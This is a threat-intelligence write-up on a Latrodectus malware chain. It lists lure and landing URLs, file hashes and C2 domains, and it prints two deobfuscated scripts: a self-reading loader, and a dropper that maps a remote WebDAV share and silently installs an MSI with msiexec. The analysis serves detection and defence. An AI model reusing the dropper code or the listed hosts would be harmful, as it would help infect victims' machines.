THREAT IDENTIFICATION: LATRODECTUS

SUBJECTS OBSERVED
Contact Submission

INFECTION FLOW
.eml -> url -> .js -> .js (embedded) -> .msi -> .dll (likely embedded)

URL FROM THE EMAIL
https://alan4president.com/b1750616502008583h13326991a44/casea22036311d7287/court/public/898372694484/dwnld/documents?n59985026=1631051366&c=ca&dmc=www.<redacteed>.com&2918060e3&cmp=sidley&6961498r7

FILTERED COMPUTERS REDIRECTED TO:
https://harvardlawreview.org/wp-content/uploads/2016/06/2289-2296-Online.pdf?2918060e3&6961498r7&c=ca&cmp=sidley&dmc=www.<redacteed>.com&n59985026=1631051366

LANDING PAGE URL
https://gulfinsidermedia.com/?2918060e3&6961498r7&c=ca&cmp=sidley&dmc=www.<redacteed>.com&n59985026=1631051366

JAVASCRIPT FILE DOWNLOAD URL
https://firebasestorage.googleapis.com/v0/b/tst-4828.appspot.com/o/22OEf9N8Pv%2FLetter_k08_27h181190-57w49674g3400-9586e9.js?alt=media&token=225d98fc-c948-41e4-8803-f3988791b8f6

JAVASCRIPT FILE HASH
Letter_k08_27h181190-57w49674g3400-9586e9.js
fdec2d3ab8e13d309a097622944a085e

DEOBFUSCATED JAVASCRIPT FILE
var fso = new ActiveXObject('Scripting.FileSystemObject')
var scriptPath = WScript.ScriptFullName
try {
if (fso.FileExists(scriptPath)) {
var file = fso.OpenTextFile(scriptPath, 1)
var scriptCode = ''
while (!file.AtEndOfStream) {
var line = file.ReadLine()
if (line.indexOf('////') === 0) {
scriptCode += line.substring(4) + '\n'
}
}
file.Close()
if (scriptCode) {
var func = new Function(scriptCode)
func()
}
}
} catch (e) {}

DEOBFUSCATED SECOND EMBEDDED SCRIPT
var network = new ActiveXObject("WScript.Network");
for (var driveLetter = 90; driveLetter >= 65; driveLetter--) {
    var letter = String.fromCharCode(driveLetter) + ":";
    try {
       network.MapNetworkDrive(letter, "\\\\45.140.146.156@80\\share\\");
        var startTime = new Date();
        while (new Date() - startTime < 6000) {}
        GetObject("winmgmts:\\\\.\\root\\cimv2").Get("Win32_Process").Create('msiexec.exe -i \\\\45.140.146.156@80\\share\\observ.msi -qn', null, null, null);
        network.RemoveNetworkDrive(letter);
        break;
    } catch (e) {
    }
}

TRAFFIC OBSERVED TO
http://45.140.146.156/share
http://45.140.146.156/share/Desktop.ini
http://45.140.146.156/share/AutoRun.inf
http://45.140.146.156/share/observ.msi

MSI FILE HASH
observ.msi
876c5d995847eb3acfbe3a546648a7fb

SCRIPT ERROR (LIKELY A DECOY)
There was a problem starting 
C:\Users\analyst\AppData\Local\Putty/setordinal.dll

URL REFERENCED IN FILE
https://github.com/mar10/wsgidav/

"A generic and extendable WebDAV server written in Python and based on WSGI"
(See OpenDir Screenshot below)

DLL FILE HASH
setordinal.dll
50a91559fab7869d51c0a7727c47a783

DLL LAUNCH COMMAND
rundll32 setordinal.dll,bhuf

C2 TRAFFIC
https://plwskoret.top/live/
https://miistoria.com/live/


